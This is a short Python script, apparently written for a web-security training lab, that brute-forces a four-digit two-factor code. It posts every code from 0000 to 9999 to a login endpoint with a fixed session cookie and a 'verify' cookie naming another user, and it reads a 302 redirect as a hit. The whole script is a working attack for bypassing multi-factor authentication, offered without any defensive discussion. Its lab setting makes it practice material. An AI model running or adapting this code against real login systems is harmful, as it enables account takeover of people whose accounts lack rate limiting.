import requests
from bs4 import BeautifulSoup

url = "https://0a1900cb03048635c0d5405300e20007.web-security-academy.net/login2"
token = ""

for a in range(0,10):
	for b in range(0,10):
		for c in range(0,10):
			for d in range(0,10):
				a = str(a)
				b = str(b)
				c = str(c)
				d = str(d)

				token = f"{a}{b}{c}{d}"
				cookies = {
				"verify": "carlos",
				"session": "9nblUW7FhKLDPsLacFFRiQq22vWquQrS"
				}
				data = f"mfa-code={token}"
				print(f"payload data {data}")

				res = requests.post(url,data=data,cookies=cookies)
				status = res.status_code

				if(status == 200):
					print("salah, next")
				elif(status == 302):
					print(f"ketemu, {token}")
					break